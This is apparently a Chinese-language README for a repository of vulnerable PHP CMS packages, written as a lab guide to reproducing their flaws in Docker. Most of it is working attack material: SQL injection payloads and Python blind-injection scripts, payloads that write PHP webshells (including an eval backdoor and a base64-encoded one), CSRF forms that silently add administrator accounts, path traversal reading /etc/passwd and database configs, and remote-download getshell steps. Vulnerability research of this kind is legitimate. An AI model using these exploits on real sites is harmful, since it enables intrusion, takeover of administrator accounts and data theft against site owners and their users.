该项目是为了方便在对CMS漏洞进行复现的时候花费大量的时间在网上搜索漏洞源码，从而有了此项目。此项目仅为安全研究使用并且所有CMS存在大量漏洞，请勿以此建站。

## 环境搭建

经过测试，本项目的源码均可使用docker安装运行

```
# 拉取镜像
docker pull medicean/vulapps:base_lamp
# 利用镜像启动容器
docker run -d -p 8080:80 medicean/vulapps:base_lamp
```

镜像信息

```
系统版本：Ubuntu 14.04.5
Apache版本：2.4.7
PHP版本：5.5.9
MySQL版本：5.5.61
Web路径：/var/www/html
数据库账号密码：root/root
```

部分CMS需要php-curl扩展，进入到容器里执行

```
apt-get update
apt install php5-curl
```

然后重启apache或者docker即可。

## 漏洞信息

### iseacms

```
版本信息：1.0
```

#### 前台留言XSS

在【联系】下方的留言处插入payload

![Snipaste_2022-10-12_10-43-55](images/Snipaste_2022-10-12_10-43-55.jpg)前台触发

![Snipaste_2022-10-12_10-45-13](images/Snipaste_2022-10-12_10-45-13.jpg)

后台管理员查看留言也会触发

![Snipaste_2022-10-12_10-46-06](images/Snipaste_2022-10-12_10-46-06.jpg)

#### 文章处SQL注入

随意点开一篇文章

![Snipaste_2022-10-12_11-01-21](images/Snipaste_2022-10-12_11-01-21.jpg)

在cid处存在漏洞

![Snipaste_2022-10-12_11-02-10](images/Snipaste_2022-10-12_11-02-10.jpg)

使用报错注入获取数据库名

```
and(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))
```

![Snipaste_2022-10-12_11-03-41](images/Snipaste_2022-10-12_11-03-41.jpg)

#### 后台登录处SQL注入

输入1'即可引起报错

![Snipaste_2022-10-12_10-54-18](images/Snipaste_2022-10-12_10-54-18.jpg)

```
1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #
```

![Snipaste_2022-10-12_10-52-55](images/Snipaste_2022-10-12_10-52-55.jpg)

![Snipaste_2022-10-12_10-53-06](images/Snipaste_2022-10-12_10-53-06.jpg)

### yxcms

```
版本信息：1.2.1
```

#### 前台留言XSS

在前台留言处插入payload

![Snipaste_2022-10-12_13-28-40](images/Snipaste_2022-10-12_13-28-40.jpg)

管理员查看留言即可触发

![Snipaste_2022-10-12_13-30-44](images/Snipaste_2022-10-12_13-30-44.jpg)

#### CSRF添加管理员

火狐浏览器

构造poc，将以下内容复制到html文件

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.81.116:10003/index.php?r=admin/admin/index" method="POST">
      <input type="hidden" name="groupid" value="1" />
      <input type="hidden" name="username" value="demo" />
      <input type="hidden" name="rpassword" value="123456" />
      <input type="hidden" name="spassword" value="123456" />
      <input type="hidden" name="realname" value="demo" />
      <input type="hidden" name="iflock" value="0" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

将该文件诱使管理员打开访问

管理员在登录的情况下访问了该文件即可成功添加一个管理员用户，攻击者使用添加的管理员可成功登录后台

![Snipaste_2022-10-12_15-22-13](images/Snipaste_2022-10-12_15-22-13.jpg)

### 74cms

```
版本信息：6.0.4
```

#### 文件包含getShell

```
get:
index.php?m=home&a=assign_resume_tpl

post:
variable=1&tpl=<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST[x]);?>")?>; ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

![Snipaste_2022-10-12_14-11-03](images/Snipaste_2022-10-12_14-11-03.jpg)

会将内容写入到日志文件里。包含日志文件即可生成一个webshell（目录需要有写入的权限，如果没有写入的权限需要修改上方php代码的shell生成的路径）

```
get:
index.php?m=home&a=assign_resume_tpl

post:
variable=1&tpl=data/Runtime/Logs/Home/22_10_12.log   #日志文件为日期
```

![Snipaste_2022-10-12_14-12-21](images/Snipaste_2022-10-12_14-12-21.jpg)

使用蚁剑连接webshell

![Snipaste_2022-10-12_14-14-44](images/Snipaste_2022-10-12_14-14-44.jpg)

#### CSRF添加管理员

火狐浏览器

构造poc，将以下内容复制到html文件

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.81.116:10004/index.php?m=admin&c=admin&a=add" method="POST">
      <input type="hidden" name="username" value="demo" />
      <input type="hidden" name="email" value="demo&#64;qq&#46;com" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="repassword" value="123456" />
      <input type="hidden" name="role&#95;id" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

将该文件诱使管理员打开访问

管理员在登录的情况下访问了该文件即可成功添加一个管理员用户，攻击者使用添加的管理员可成功登录后台

![Snipaste_2022-10-12_15-17-09](images/Snipaste_2022-10-12_15-17-09.jpg)

### damicms

```
版本信息：5.5.1
```

#### 普通用户XSS

注册普通用户，在资料修改处随意插入XSS的payload

![Snipaste_2022-10-11_17-03-26](images/Snipaste_2022-10-11_17-03-26.jpg)

管理员查看会员信息即可触发

![Snipaste_2022-10-11_17-06-50](images/Snipaste_2022-10-11_17-06-50.jpg)

#### 逻辑漏洞0元购

在产品展示里选择产品购买，付款方式选择站内扣款

![Snipaste_2022-10-11_17-11-47](images/Snipaste_2022-10-11_17-11-47.jpg)

提交订单抓包，把qty（订单数量）的值修改为负数

![Snipaste_2022-10-11_17-13-18](images/Snipaste_2022-10-11_17-13-18.jpg)

即可成功下单并反向充值

![Snipaste_2022-10-11_17-14-45](images/Snipaste_2022-10-11_17-14-45.jpg)

![Snipaste_2022-10-11_17-15-20](images/Snipaste_2022-10-11_17-15-20.jpg)

### metinfo

```
版本信息：6.0.0
```

#### 任意文件读取

读取数据库配置文件

```
/include/thumb.php?dir=.....///http/.....///config/config_db.php
```

![Snipaste_2022-10-13_15-03-00](images/Snipaste_2022-10-13_15-03-00.jpg)

读取其它系统文件

```
/include/thumb.php?dir=.....///http/.....///.....///.....///.....///.....////etc/passwd
```

![Snipaste_2022-10-13_16-05-27](images/Snipaste_2022-10-13_16-05-27.jpg)

### thinkcmf

```
版本信息：2.2.3
```

#### 任意文件包含

包含默认文件

```
?a=display&templateFile=README.md
```

![Snipaste_2022-10-17_15-13-34.jpg](images/Snipaste_2022-10-17_15-13-34.jpg)
包含系统敏感文件

```
?a=display&templateFile=../../../../..//etc/passwd
```

![Snipaste_2022-10-17_15-18-56.jpg](images/Snipaste_2022-10-17_15-18-56.jpg)

#### getshell

```
?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('data/test.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4='))</php>
```

![Snipaste_2022-10-17_15-24-14.jpg](images/Snipaste_2022-10-17_15-24-14.jpg)
文件写入到data目录下，使用蚁剑连接
![Snipaste_2022-10-17_15-27-24.jpg](images/Snipaste_2022-10-17_15-27-24.jpg)

### rejucms

```
版本信息：2.1
```

#### 越权登录后台

增加cookie admin_name=admin
![Snipaste_2022-10-18_15-04-27.jpg](images/Snipaste_2022-10-18_15-04-27.jpg)
然后访问后台即可越权进入后台

```
/admin/cms_welcome.php
```

![Snipaste_2022-10-18_15-04-42.jpg](images/Snipaste_2022-10-18_15-04-42.jpg)

### feifeicms

```
版本信息：4.0.18
```

#### 用户id遍历

注册账号登录之后可以看的自己的id
![Snipaste_2022-10-18_16-41-36.jpg](images/Snipaste_2022-10-18_16-41-36.jpg)
遍历该id后可以知道有没有被注册
![Snipaste_2022-10-18_16-43-18.jpg](images/Snipaste_2022-10-18_16-43-18.jpg)

#### 任意用户刷分

在注册后系统会赠送10积分，随意注册一个账号，然后抓取注册的请求包,将请求包的内容修改为user_id=2，2为自己的id
![Snipaste_2022-10-18_17-00-48.jpg](images/Snipaste_2022-10-18_17-00-48.jpg)
![Snipaste_2022-10-18_17-02-14.jpg](images/Snipaste_2022-10-18_17-02-14.jpg)
然后重复发送请求，可以看的自己的账号的影币变多了
![Snipaste_2022-10-18_17-03-00.jpg](images/Snipaste_2022-10-18_17-03-00.jpg)

### catfishcms

```
版本信息：4.4.14
```

#### CSRF修改用户信息

注册账户，登录后进入个人中心编辑资料，
![Snipaste_2022-10-20_11-16-22.jpg](images/Snipaste_2022-10-20_11-16-22.jpg)
然后抓包
![Snipaste_2022-10-20_11-17-31.jpg](images/Snipaste_2022-10-20_11-17-31.jpg)
生成恶意文件html文件
生成后将改文件发给受害者（或者将该文件放到攻击者的服务器里，然后把链接发给受害者），受害者在登录网站的情况下在同一个浏览器打开该文件，受害者的个人信息就被修改了
![Snipaste_2022-10-20_11-21-26.jpg](images/Snipaste_2022-10-20_11-21-26.jpg)
![Snipaste_2022-10-20_11-21-55.jpg](images/Snipaste_2022-10-20_11-21-55.jpg)

### qibocms

```
版本信息：7.0
```

#### 任意文件下载

读取/etc/passwd，为了确保能跨越到路径读取到目标文件，可以多加几个../../../

```
/do/job.php?job=download&url=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
```

把要下载的文件进行base64编码
![Snipaste_2022-10-20_14-33-03.jpg](images/Snipaste_2022-10-20_14-33-03.jpg)

#### 报错注入

注册一个会员，然后构造一个上传表单

```
<form action="http://192.168.81.116:30002/member/comment.php?job=edit" method="POST" enctype="multipart/form-data">
<input type="file" name="cidDB" value="test" style="350px;"/><br/> 
<input type="submit" value="确定"/> </form>
```

随意上传一个文件然后抓包，将URL里的edit修改为del，注入点在文件名处
![Snipaste_2022-10-20_14-48-36.jpg](images/Snipaste_2022-10-20_14-48-36.jpg)
获取当前数据库名称

```
' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

### eyoucms

```
版本信息：1.0.9
```

#### 任意文件写入Getshell

漏洞路径

```
/index.php/api/Uploadify/preview
```

POST内容：<?php phpinfo();  的base64编码

```
data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
```

![Snipaste_2022-10-24_15-13-45.jpg](images/Snipaste_2022-10-24_15-13-45.jpg)
写入的文件路径为
![Snipaste_2022-10-24_15-15-03.jpg](images/Snipaste_2022-10-24_15-15-03.jpg)

### bluecms

```
版本信息：1.6
```

#### SQL注入

```
ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()
```

![Snipaste_2022-10-24_14-41-55.jpg](images/Snipaste_2022-10-24_14-41-55.jpg)

#### 后台宽字节注入万能密码登录

```
admin%df' or 1=1
```

![Snipaste_2022-10-24_14-47-12.jpg](images/Snipaste_2022-10-24_14-47-12.jpg)

#### 用户注册处XSS

注册的时候抓包，在邮箱处插入payload
![Snipaste_2022-10-24_15-04-20.jpg](images/Snipaste_2022-10-24_15-04-20.jpg)
在个人中心处即可看到触发了弹窗
![Snipaste_2022-10-24_15-05-12.jpg](images/Snipaste_2022-10-24_15-05-12.jpg)
管理员登录后台查看会员列表，亦可看到触发弹窗
![Snipaste_2022-10-24_15-06-29.jpg](images/Snipaste_2022-10-24_15-06-29.jpg)

### empirecms

```
版本信息：6.0
```

#### 反射型XSS

```
search/keyword/index.php?allsame=3"><script>alert(1)</script>
```

![Snipaste_2022-10-24_16-12-45.jpg](images/Snipaste_2022-10-24_16-12-45.jpg)

### onethink

```
版本信息：1.0.131129
```

#### SQL注入万能密码登录

打开拦截，然后登录抓包
![Snipaste_2022-10-25_14-34-46.jpg](images/Snipaste_2022-10-25_14-34-46.jpg)
![Snipaste_2022-10-25_14-35-44.jpg](images/Snipaste_2022-10-25_14-35-44.jpg)

```
username[0]=exp&username[1]=)) union select 1,2,'',4,5,6,7,8,9,10,1#&password=&fe3hb
```

![Snipaste_2022-10-25_14-33-09.jpg](images/Snipaste_2022-10-25_14-33-09.jpg)

### opensns

```
版本信息：6.1.0
```

#### 前台sql注入

```
import requests
from requests import exceptions

url = "http://192.168.81.195:50002/index.php?s=/home/addons/_addons/china_city/_controller/china_city/_action/getcity.html"

header = {'X-Requested-With': 'XMLHttpRequest'}
# proxies={'http':'127.0.0.1:8080'}
flag = ''
for i in range(1, 50):
    for j in range(32, 128):
        try:
            data = {
                'cid': 0,
                'pid[0]': "=(select if(ord(substr((select database()),{},1))={},sleep(10),0))AND 3 IN  ".format(i, j),
                'pid[1]': 3
            }
            # print data['pid[0]']
            r = requests.post(url, data=data, headers=header, timeout=5)

        except exceptions.Timeout:
            flag += chr(j)
            print(flag)

```

### cmseasy

```
版本信息：7.6.3.2
```

#### 支付逻辑漏洞

首先注册一个账户，可以看到账户是0元
![Snipaste_2022-10-28_13-57-39.jpg](images/Snipaste_2022-10-28_13-57-39.jpg)
然后在精选产品里随意选择一个商品购买
![Snipaste_2022-10-28_14-07-30.jpg](images/Snipaste_2022-10-28_14-07-30.jpg)
然后抓包
![Snipaste_2022-10-28_14-07-47.jpg](images/Snipaste_2022-10-28_14-07-47.jpg)
将thisnum的值修改为负数，可以看到金额变成了负数
![Snipaste_2022-10-28_14-08-07.jpg](images/Snipaste_2022-10-28_14-08-07.jpg)
进入到支付页面选择余额支付
![Snipaste_2022-10-28_14-08-39.jpg](images/Snipaste_2022-10-28_14-08-39.jpg)
可以看到购买成功
![Snipaste_2022-10-28_14-08-52.jpg](images/Snipaste_2022-10-28_14-08-52.jpg)
回到个人中心了也可以看到自己的余额变多了
![Snipaste_2022-10-28_14-09-18.jpg](images/Snipaste_2022-10-28_14-09-18.jpg)

### lmxcms

```
版本信息：1.41
```

#### sql注入

```
import requests

url = "http://192.168.81.195:50006/?m=search&keywords=b&mid=1&remen=1 or (if(ascii(substr(database(),{},1))={},1,0))--+"
sjk = ""

for i in range(1, 7):
    for j in range(80, 180):
        cl = url.format(i, hex(j))
        res = requests.get(cl)
        if len(res.text) > 6000:
            sjk += chr(j)
            print(sjk)
```

![Snipaste_2022-10-28_17-18-38.jpg](images/Snipaste_2022-10-28_17-18-38.jpg)

### beescms

```
版本信息：4.0
```

#### sql注入

后台登录处，在用户名后加单引号发现报错

```admin' a and nd extractvalue(1,concat(0x7e,(select database()),0x7e))#

```

![Snipaste_2022-10-31_17-03-20.jpg](images/Snipaste_2022-10-31_17-03-20.jpg)

#### 后台验证码不刷新

输入一次正确的验证码然后抓包，可以发现多次改变密码都是提示密码错误
![Snipaste_2022-10-31_17-06-23.jpg](images/Snipaste_2022-10-31_17-06-23.jpg)
对密码进行爆破
![Snipaste_2022-10-31_17-08-20.jpg](images/Snipaste_2022-10-31_17-08-20.jpg)

### phpok

```
版本信息：5.3
```

#### sql注入

```
import requests

database = ""
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42"
}
# proxier = {
#     "http": "127.0.0.1:8080"
# }

for i in range(1, 6):
    for a in range(47, 127):
        payload = "http://192.168.81.195:11000/api.php?c=project&f=index&token=1234&id=news&sort=(1 and if(ascii(substr(database(),{},1))={},sleep(3),1))".format(
            i, a)
        re = requests.get(url=payload, headers=header, timeout=25)
        # print(re.elapsed.total_seconds())
        if re.elapsed.total_seconds() > 10:
            database += chr(a)
            print(database)

```

![Snipaste_2022-11-01_15-18-56.jpg](images/Snipaste_2022-11-01_15-18-56.jpg)

### niushop

```
版本信息：2.2
```

#### 远程文件下载getshell

url

```
index.php?s=/admin/Upgradeonline/downloadPatchZip
```

post data

```
download_url=http://192.168.81.116:1234/1.php&patch_release=1
```

需要在请求头增加

```
X-Requested-With: XMLHttpRequest
```

1.php文件内容：

```
<?php
  phpinfo();
/*
abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
abcdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
*/
?>
```

![Snipaste_2022-11-01_17-36-21.jpg](images/Snipaste_2022-11-01_17-36-21.jpg)
![Snipaste_2022-11-01_17-37-56.jpg](images/Snipaste_2022-11-01_17-37-56.jpg)

### php7cms

#### 文件包含

```
版本信息：20181009
```

利用网站自带的错误日志来进行包含

```
index.php?s=news&c=search&keyword=%E5%9B%BA%E5%AE%9A&order=2%3C?=/*&sss=*/eval($_GET[1]);
```

这样就会生成一个错误日志cache/error/log-2022-11-21.php

命名规则就是log-年-月-日.php

包含该文件

```
index.php?s=api&c=api&m=template&name=../../../../cache/error/log-2022-11-21.php&1=phpinfo();
```

会以注释的方式包含出来

![image-20221121140433239](images/image-20221121140433239.png)

![image-20221121140503763](images/image-20221121140503763.png)

![image-20221121140319648](images/image-20221121140319648.png)

### kyxscms

```
版本信息：1.5.3
```

#### CSRF修改个人信息

首先注册一个普通用户，然后抓包构造恶意代码

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.81.195:12343/user/user/info.html" method="POST">
      <input type="hidden" name="email" value="test&#64;qq&#46;com" />
      <input type="hidden" name="introduce" value="test" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

然后将引导受害者访问恶意文件，受害者在火狐浏览器登录了账号的情况下访问了该恶意文件，个人信息即可被修改

受害者原信息

![image-20221121161025167](images/image-20221121161025167.png)

访问恶意文件后

![image-20221121161107270](images/image-20221121161107270.png)

![image-20221121161124187](images/image-20221121161124187.png)

#### CSRF添加管理员

目前只有一个管理员

![image-20221121162441513](images/image-20221121162441513.png)

构造恶意文件诱导管理员访问

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.81.195:12343/admin/member/add.html" method="POST">
      <input type="hidden" name="username" value="test2" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="repassword" value="123456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

成功添加管理员

![image-20221121162526088](images/image-20221121162526088.png)

利用添加的管理员登录

![image-20221121162616751](images/image-20221121162616751.png)

### youdiancms

```
版本信息：8.0
```

#### sql注入

```
import requests
import string
import time

s = requests.session()


def check(baseurl, payload):
    url = baseurl + "/index.php/Channel/voteAdd"
    cookies = {
        "PHPSESSID": "pn9iofrfklen68u4205veml8s0",
        "youdianAdminLangSet": "cn",
        "youdianfu[0]": "exp",
        "youdianfu[1]": payload
    }
    starttime = time.time()
    s.get(url, cookies=cookies)
    endtime = time.time()
    if endtime - starttime >= 3:
        return True
    return False


def getLength(baseurl):
    for i in range(30):
        payload = "=(select 1 from(select if(length(database())={0},sleep(3),0))a)".format(str(i))
        if check(baseurl, payload):
            print("[+] database len: " + str(i))
            return i


def getDatabase(baseurl, length):
    stringset = string.digits + string.ascii_letters
    database = ""
    for i in range(length):
        for j in stringset:
            payload = "=(select 1 from(select if(ascii(substr(database(), {0}, 1))={1},sleep(3),0))a)".format(
                str(i + 1), str(ord(j)))
            if check(baseurl, payload):
                database += str(j)
                print("[+] " + database)


if __name__ == '__main__':
    url = 'http://192.168.81.195:9999/'
    length = getLength(url)
    getDatabase(url, length)
```

![image-20221122095240888](images/image-20221122095240888.png)

### cltphp

```
版本信息：5.5
```

#### 任意文件上传

在与下方python文件同级目录新建一个php文件

```
# !/usr/bin/python
# -*- coding: UTF-8 -*-
# Author：Bypass
# Date：2018.03.01
import requests
import sys


proxier = {
    "http": "127.0.0.1:8080"
}

def CLPHP_upload(url):
    header = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)',
              'X-Requested-With': 'XMLHttpRequest', }
    geturl = url + "/user/upFiles/upload"
    files = {'file': ('1.php', open('1.php', 'rb'), 'image/jpeg')}
    res = requests.post(geturl, files=files, proxies=proxier, headers=header)
    print(res.text)


if __name__ == "__main__":
    if len(sys.argv) == 2:
        url = sys.argv[1]
        CLPHP_upload(url)
        sys.exit(0)
    else:
        print("usage: %s www.xxx.com" % sys.argv[0])
        sys.exit(-1)
```

![image-20221122164343109](images/image-20221122164343109.png)

运行脚本即可将文件上传到服务器getshell

![image-20221122164551095](images/image-20221122164551095.png)

### sinsiucms

```
版本信息：1.0
```

#### CSRF添加管理员

![image-20221123100603812](images/image-20221123100603812.png)

构造恶意文件

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.81.116:12358/admin.php?/basic/index.html" method="POST">
      <input type="hidden" name="cmd" value="add&#95;admin" />
      <input type="hidden" name="adm&#95;username" value="test2" />
      <input type="hidden" name="adm&#95;password" value="123456" />
      <input type="hidden" name="re&#95;password" value="123456" />
      <script> document.forms[0].submit(); </script>
    </form>
  </body>
</html>
```

管理员在浏览器登录了网站的情况下使用该浏览器访问了该恶意文件，即可成功添加管理员

![image-20221123101401782](images/image-20221123101401782.png)

虽然添加的用户默认没有权限，但是还可以构造恶意文件使管理员给新增的用户添加权限。

### fannuocms

```
版本信息：2.1
```

#### 后台任意文件上传

登录后台后在添加频道里

![image-20221123171928228](images/image-20221123171928228.png)

上传图片马

![image-20221123171952120](images/image-20221123171952120.png)

在bp里可以找到图片的地址

![image-20221123172028611](images/image-20221123172028611.png)

然后在频道模型处修改为图片马的地址，注意需要添加../../

![image-20221123172125776](images/image-20221123172125776.png)

发布频道，在网站首页可以看到频道

![image-20221123172243331](images/image-20221123172243331.png)

打开频道即可看到成功将图片马包含了

![image-20221123172312304](images/image-20221123172312304.png)

### ucms

```
版本信息：1.4.8
```

#### 后台任意文件写入

登录后台后进入到【文件管理】

![image-20221124151729867](images/image-20221124151729867.png)

然后直接上传webshell文件即可

![image-20221124151811491](images/image-20221124151811491.png)

### taocms

```
版本信息：3.0.1
```

#### 后台任意文件读取

登录后台后

![image-20221124171023307](images/image-20221124171023307.png)

在文件管理处可以读取任意文件

![image-20221124171312853](images/image-20221124171312853.png)

#### 编辑后台文件getshell

比如编辑rss文件，然后插入一句话木马，这插入的是phpinfo

![image-20221124172649356](images/image-20221124172649356.png)

然后访问rss.php

![image-20221124172737293](images/image-20221124172737293.png)

### jtbccms

```
版本信息：3.0
```

#### 后台任意文件上传

登录后在联系我们处上传文件

![image-20221202143131775](images/image-20221202143131775.png)

然后抓包，将该请求包的URL修改

![image-20221202143222920](images/image-20221202143222920.png)

改为

```
/console/file/manage.php?type=action&action=addfile&path=../.././
```

![image-20221202143243875](images/image-20221202143243875.png)

上传后的文件

![image-20221202143422767](images/image-20221202143422767.png)

### jizhicms

```
版本信息：1.9.5
```

#### 远程文件下载Getshell

登录进后台后，在扩展管理的插件列表，下载插件然后抓包，

![image-20221202162749825](images/image-20221202162749825.png)

然后在服务器新建一个php文件并将其压缩，放到web目录下是其可以被下载

![image-20221202163309807](images/image-20221202163309807.png)

需要抓取实时的请求包，然后将该请求包的下载url修改为自己服务器的压缩包的url

![image-20221202162956439](images/image-20221202162956439.png)

![image-20221202163415847](images/image-20221202163415847.png)

需要一直修改大概几十个包，直到看到以下请求包

![image-20221202163520582](images/image-20221202163520582.png)

继续修改url，也是需要一直修改，大概几十次，最后webshell路径为

```
/A/exts/1.php
```

![image-20221202163616979](images/image-20221202163616979.png)

### duomicms

```
版本信息：1.3.2
```

#### 前台sql注入

```
/duomiphp/ajax.php?action=addfav&id=1&uid=1 and extractvalue(1,concat_ws(0x3A,0x3A,database()))
```

![image-20221205155614944](images/image-20221205155614944.png)

#### 前台代码执行

```
/search.php?searchword={if:phpinfo()}phpinfo(){end
```

![image-20221205155728383](images/image-20221205155728383.png)

### xiaocms

```
版本信息：20141229
```

#### 后台任意文件上传

登录后台获取cookie

构造上传表单

```
<html>
    <body>
    <form action="http://192.168.81.195:10100/admin/index.php?c=uploadfile&a=uploadify_upload&type=php&size=1000" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" name="submit" value="submit" />
    </form>
</body>
</html>
```

上传php文件抓包，将管理员的cookie替换到请求包里即可成功上传文件

![image-20221206161643224](images/image-20221206161643224.png)

![image-20221206161717053](images/image-20221206161717053.png)

### apsystem

```
版本信息：无
```

#### 后台任意文件上传

![image-20221206173818160](images/image-20221206173818160.png)

再Employee List新建

填写好信息之后上传php文件

![image-20221206173909017](images/image-20221206173909017.png)

上传后的文件保存在images目录下，文件名为原文件名

![image-20221206173940736](images/image-20221206173940736.png)

### emlog

```
版本信息：6.0.0
```

#### 后台sql注入

登录后找到token值

![image-20221207155143025](images/image-20221207155143025.png)

然后替换token值后请求，

```
admin/comment.php?action=delbyip&token=4eeb0789d73618c2e56c88685e58a8cf&ip=127.0.0.1%27%20and%20(extractvalue(1,concat(0x7e,(select%20database()),0x7e)))%23
```

![image-20221207155302416](images/image-20221207155302416.png)

### dunlingcms

```
版本信息：1.0
```

#### 万能密码登录

随便输入账号密码抓包

![image-20221207170438278](images/image-20221207170438278.png)

把用户名改为

```
admin' #
```

![image-20221207170504632](images/image-20221207170504632.png)

成功登录到后台

![image-20221207170555952](images/image-20221207170555952.png)

#### 越权登录后台

访问后台页面

```
/admin/axadmin.php
```

然后将cookie改为admin=yes

成功越权进入后台

![image-20221207170842017](images/image-20221207170842017.png)

### semcms

```
版本信息：1.4
```

#### 后台sql注入

登录进后台后进入到【信息管理】的【博客管理】，选中博客并且删除然后抓包

![image-20221208155305246](images/image-20221208155305246.png)

构造时间盲注，成功执行了sleep

![image-20221208155423824](images/image-20221208155423824.png)

获取数据库名长度

![image-20221208155507763](images/image-20221208155507763.png)

```
import requests

database = ""
header = {
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Cookie": "theme=default; frontLang=zh-cn; __bid_n=184ada2f395ab4dd774207; ECS[visit_times]=2; ishistory=1; gnolt4_admin_username=admin; PHPSESSID=ksj15tsgisn8b7fhq40uvkif11",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.42"
}
# proxier = {
#     "http": "127.0.0.1:8080"
# }

for i in range(1, 7):
    for a in range(47, 127):
        payload = "http://192.168.81.116:12342/hXd0MR_AhF/Ant_Inc.php?action=Clear&sort=info&lgid=1"
        data = "DID[]=15 and if(ascii(substr(database(),{},1))={},sleep(3),1)".format(i, a)
        re = requests.post(url=payload, data=data, headers=header, timeout=10)
        # print(re.elapsed.total_seconds())
        if re.elapsed.total_seconds() > 6:
            database += chr(a)
            print(database)
```

![image-20221208160247571](images/image-20221208160247571.png)

### classcms

```
版本信息：1.3
```

#### 远程文件下载getshell

登录进后台，进入应用商店主页

![image-20221214164619525](images/image-20221214164619525.png)

选择应用下载

![image-20221214164647789](images/image-20221214164647789.png)

点击下载然后抓包

![image-20221214164713622](images/image-20221214164713622.png)

以下请求包放过

![image-20221214164743757](images/image-20221214164743757.png)

然后抓取到以下请求包

![image-20221214164812024](images/image-20221214164812024.png)

可以将classhash修改，随意修改，并将url修改为自己的地址，1.zip里含有一个1.php

![image-20221214164911618](images/image-20221214164911618.png)

将包发送过去后在浏览器看到格式错误，不用理会，实际上文件已经下载到服务器了

![image-20221214165023205](images/image-20221214165023205.png)

webshell路径为

```
/class/[classhash值]/压缩包内php文件
```

![image-20221214165145891](images/image-20221214165145891.png)